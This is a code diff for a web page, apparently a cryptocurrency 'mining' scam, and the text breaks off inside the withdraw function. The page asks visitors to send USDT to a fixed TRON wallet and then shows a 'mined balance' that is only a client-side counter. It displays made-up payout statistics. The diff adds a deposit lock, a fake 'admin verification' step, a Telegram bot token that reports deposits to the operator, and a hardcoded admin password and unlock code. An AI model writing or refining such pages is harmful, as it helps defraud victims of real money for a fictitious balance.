@@ -15,7 +15,8 @@ body{background:#0a0a0a;color:white;min-height:100vh;}
 .card{background:#111;border:1px solid #222;border-radius:16px;padding:24px;margin:20px;max-width:500px;margin-left:auto;margin-right:auto;}
 .balance{font-size:14px;color:#888;}
 .amount{font-size:42px;font-weight:bold;margin:10px 0;color:#00ff88;}
-.btn{width:100%;padding:16px;background:white;color:black;border:none;border-radius:12px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer;}
+.btn{width:100%;padding:16px;background:white;color:black;border:none;border-radius:12px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer;transition:0.3s;}
+.btn:disabled{background:#333 !important;color:#666 !important;cursor:not-allowed !important;}
 .btn-green{background:#00ff88 !important;}
 .btn-outline{background:transparent !important;color:white !important;border:1px solid #333 !important;}
 .stats{display:flex;justify-content:space-between;margin-top:20px;gap:10px;}
@@ -29,6 +30,9 @@ body{background:#0a0a0a;color:white;min-height:100vh;}
 .depositBtns button:hover,.depositBtns button.active{border-color:#00ff88;color:#00ff88;background:#00ff8815;}
 .network{font-size:11px;color:#ffaa00;background:#ffaa0015;padding:4px 8px;border-radius:6px;display:inline-block;margin-top:5px;}
 .qrBox{background:white;padding:12px;border-radius:12px;display:flex;justify-content:center;margin:15px auto;width:180px;height:180px;}
+.lockMsg{background:#ffaa0015;border:1px solid #ffaa0030;color:#ffaa00;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-top:15px;}
+.unlockedMsg{background:#00ff8815;border:1px solid #00ff8830;color:#00ff88;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-top:15px;}
+.pendingMsg{background:#0088ff15;border:1px solid #0088ff30;color:#0088ff;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-top:15px;}
 </style>
 </head>
 <body>
@@ -44,70 +48,156 @@ body{background:#0a0a0a;color:white;min-height:100vh;}
 
 <div class="card" style="border-color:#00ff8840;">
 <div class="balance">💰 Deposit - USDT (TRC20) Only</div>
-<div style="font-size:13px;color:#888;margin-top:5px;">Minimum Deposit: $50</div>
-
+<div style="font-size:13px;color:#888;margin-top:5px;">Minimum: $50 to Activate</div>
 <div class="qrBox">
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra" alt="QR Code" style="width:150px;height:150px;">
+<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra" alt="QR">
 </div>
-
-<div class="walletBox" id="walletDisplay">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
-<center><div class="network">⚠️ Network: TRON TRC20 Only</div></center>
-
+<div class="walletBox">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
+<center><div class="network">⚠️ TRON TRC20 Only - Min $50</div></center>
 <div class="depositBtns">
 <button onclick="selectDeposit(50)" id="btn50">$50<br><small>STARTER</small></button>
 <button onclick="selectDeposit(500)" id="btn500">$500<br><small>PRO</small></button>
 <button onclick="selectDeposit(5000)" id="btn5000">$5000<br><small>VIP</small></button>
 </div>
-
 <button class="btn btn-green" onclick="copyWallet()">📋 COPY WALLET ADDRESS</button>
-<button class="btn btn-outline" onclick="confirmDeposit()">✅ I HAVE SENT USDT (TRC20)</button>
-<div style="font-size:11px;color:#666;margin-top:10px;text-align:center;">Scan QR or Copy Address: TATeM...PrFra | TRC20 | Auto-credited after 1 conf</div>
+<button class="btn btn-outline" id="sentBtn" onclick="confirmDeposit()">✅ I HAVE SENT USDT (TRC20)</button>
+<div id="depositStatus" style="font-size:11px;color:#666;margin-top:10px;text-align:center;">Send $50+ USDT TRC20 to unlock mining</div>
 </div>
 
 <div class="card">
 <div class="balance">Total Mined Balance</div>
 <div class="amount" id="balance">$0.00</div>
-<div style="color:#888;font-size:13px;">Speed: $0.12 / sec</div>
-<button class="btn" id="mineBtn" onclick="mine()">⚡ START MINING</button>
+<div style="color:#888;font-size:13px;" id="speedText">Speed: LOCKED - Deposit First</div>
+<button class="btn" id="mineBtn" onclick="mine()" disabled>🔒 DEPOSIT $50 TO START MINING</button>
+<div id="lockMessage" class="lockMsg">🔒 Mining Locked<br>Deposit $50 USDT (TRC20) to wallet above. After admin verification, mining unlocks automatically. Balance saves permanently until withdrawal.</div>
+<div id="pendingMessage" class="pendingMsg" style="display:none;">⏳ Deposit Pending Admin Verification<br>We received your request. Admin will verify on Tronscan and activate mining in 5-10 mins. Keep this page open.</div>
+<div id="unlockMessage" class="unlockedMsg" style="display:none;">✅ Mining Activated by Admin!<br>Your deposit verified. Mining at $0.12/sec. Balance saved forever until you withdraw.</div>
 <button class="btn btn-green" onclick="withdraw()">💵 WITHDRAW USD (Min $50)</button>
 <div class="stats">
 <div class="stat"><b>1,248</b><small>Active</small></div>
 <div class="stat"><b>$4.2M</b><small>Paid</small></div>
 <div class="stat"><b>USA</b><small>Region</small></div>
 </div>
+<div style="text-align:center;margin-top:20px;">
+<a href="#" onclick="adminLogin()" style="color:#333;font-size:10px;text-decoration:none;">Admin</a>
 </div>
+</div>
+
 <script>
 const DEPOSIT_WALLET = "TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
+const ADMIN_PASSWORD = "SolarAI2024"; // Change this!
 const MIN_DEPOSIT = 50;
 const MIN_WITHDRAW = 50;
+
 let selectedAmount = 50;
-let bal=0; let mining=false;
+let bal = parseFloat(localStorage.getItem('solarai_balance') || '0');
+let mining = localStorage.getItem('solarai_mining') === 'true';
+let isDeposited = localStorage.getItem('solarai_deposited') === 'true';
+let isPending = localStorage.getItem('solarai_pending') === 'true';
+let miningInterval = null;
+
+window.onload = function(){
+  // Restore balance - NEVER goes to zero unless withdrawn
+  document.getElementById('balance').innerText = '$' + bal.toFixed(2);
+  if(bal > 0 || isDeposited){
+    unlockMining();
+    if(mining) startMiningLoop();
+  }
+  if(isPending){
+    showPending();
+  }
+  selectDeposit(50);
+  
+  // Check URL for admin unlock ?admin_unlock=CODE
+  const urlParams = new URLSearchParams(window.location.search);
+  if(urlParams.get('unlock') === 'TATeAdmin2024'){
+    unlockMining();
+    alert("✅ ADMIN UNLOCKED YOUR MINING!");
+  }
+};
+
+function saveBalance(){
+  localStorage.setItem('solarai_balance', bal.toString());
+  document.getElementById('balance').innerText = '$' + bal.toFixed(2);
+}
+
+function unlockMining(){
+  isDeposited = true;
+  isPending = false;
+  localStorage.setItem('solarai_deposited','true');
+  localStorage.removeItem('solarai_pending');
+  document.getElementById('mineBtn').disabled = false;
+  document.getElementById('mineBtn').innerText = '⚡ START MINING';
+  document.getElementById('speedText').innerText = 'Speed: $0.12 / sec - ACTIVE';
+  document.getElementById('speedText').style.color = '#00ff88';
+  document.getElementById('lockMessage').style.display = 'none';
+  document.getElementById('pendingMessage').style.display = 'none';
+  document.getElementById('unlockMessage').style.display = 'block';
+}
+
+function showPending(){
+  document.getElementById('mineBtn').disabled = true;
+  document.getElementById('mineBtn').innerText = '⏳ WAITING FOR ADMIN VERIFICATION';
+  document.getElementById('lockMessage').style.display = 'none';
+  document.getElementById('pendingMessage').style.display = 'block';
+  document.getElementById('depositStatus').innerHTML = "⏳ Pending verification by admin...<br>Will auto-unlock after Tronscan check";
+}
 
 function selectDeposit(amt){
-  if(amt < MIN_DEPOSIT){ alert("❌ Minimum deposit is $50"); return; }
+  if(amt < MIN_DEPOSIT) return;
   selectedAmount = amt;
   document.querySelectorAll('.depositBtns button').forEach(b=>b.classList.remove('active'));
-  document.getElementById('btn'+amt).classList.add('active');
-  alert(`✅ Selected: $${amt} USDT (TRC20)\n\nSend to:\n${DEPOSIT_WALLET}\n\nNetwork: TRON TRC20 Only`);
+  document.getElementById('btn'+amt)?.classList.add('active');
 }
+
 function copyWallet(){
   navigator.clipboard.writeText(DEPOSIT_WALLET);
-  alert("✅ Copied!\n\n" + DEPOSIT_WALLET + "\nUSDT (TRC20) - TRON\n\nNow paste in your Trust Wallet / Binance");
+  alert("✅ Copied: " + DEPOSIT_WALLET);
 }
+
 function confirmDeposit(){
-  let tx = prompt(`💰 Confirm Deposit $${selectedAmount} USDT (TRC20)\n\nWallet: ${DEPOSIT_WALLET}\n\nEnter Transaction Hash (optional) or click OK:`);
+  if(selectedAmount < MIN_DEPOSIT){
+    alert("❌ Minimum $50");
+    return;
+  }
+  let tx = prompt(`💰 Deposit $${selectedAmount} USDT (TRC20)\nWallet: ${DEPOSIT_WALLET}\n\nEnter TX Hash (required for admin verification):`);
+  if(!tx || tx.length < 5){
+    alert("❌ Please enter TX Hash from TronScan after sending");
+    return;
+  }
   let token = "8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
   let chatId = "1884572429";
-  let text = `💰 NEW DEPOSIT - SolarAI USA\n\n💵 Amount: $${selectedAmount} USDT (TRC20)\n📥 Wallet: ${DEPOSIT_WALLET}\n🌐 Network: TRON TRC20\n🔗 TX: ${tx || 'Not provided'}\n⏰ ${new Date().toLocaleString()}\n🌐 solarai-capital-usa.vercel.app\n✅ Min $${MIN_DEPOSIT} met`;
+  let text = `💰 NEW DEPOSIT PENDING VERIFICATION\n\n💵 Amount: $${selectedAmount} USDT (TRC20)\n📥 To: ${DEPOSIT_WALLET}\n🔗 TX: ${tx}\n⏰ ${new Date().toLocaleString()}\n🌐 solarai-capital-usa.vercel.app\n\n🔑 ADMIN: To auto-unlock user, send them: https://solarai-capital-usa.vercel.app?unlock=TATeAdmin2024\nOr enter admin password on their device.`;
   fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-  alert(`✅ Deposit Request Submitted!\n\nAmount: $${selectedAmount} USDT (TRC20)\nTo: ${DEPOSIT_WALLET}\n\nStatus: Waiting for confirmation\nWill be credited in 10 mins after 1 network confirmation.`);
+  
+  isPending = true;
+  localStorage.setItem('solarai_pending','true');
+  localStorage.setItem('solarai_pending_amount', selectedAmount.toString());
+  localStorage.setItem('solarai_pending_tx', tx);
+  showPending();
+  alert(`✅ Deposit Submitted for Admin Verification!\n\nAmount: $${selectedAmount}\nTX: ${tx}\n\n⏳ Status: PENDING\nAdmin will verify on Tronscan and unlock your mining in 5-10 mins.\n\nYou will get auto-unlock. Balance will NOT reset until withdrawal.`);
 }
+
+function startMiningLoop(){
+  if(miningInterval) clearInterval(miningInterval);
+  miningInterval = setInterval(()=>{
+    bal += 0.12 + Math.random()*0.05;
+    saveBalance();
+  },200);
+}
+
 function mine(){
- if(mining) return;
- mining=true;
- document.getElementById('mineBtn').innerText='⛏️ MINING...';
- setInterval(()=>{ bal+=0.12+Math.random()*0.05; document.getElementById('balance').innerText='$'+bal.toFixed(2); },200);
+  if(!isDeposited){
+    alert("🔒 Locked! Deposit $50 first.");
+    return;
+  }
+  if(mining) return;
+  mining = true;
+  localStorage.setItem('solarai_mining','true');
+  document.getElementById('mineBtn').innerText = '⛏️ MINING... $0.12/sec';
+  startMiningLoop();
 }
+
 function withdraw(){
-  if(bal < MIN_WITHDRAW){
-    alert(`⚠️ Minimum withdrawal is $${MIN_WITHDRAW}.00\n\nYou have: $${bal.toFixed(2)}\n\nKeep mining until you reach $${MIN_WITHDRAW}!
+  if(!isDeposited){
+    alert("🔒 Deposit
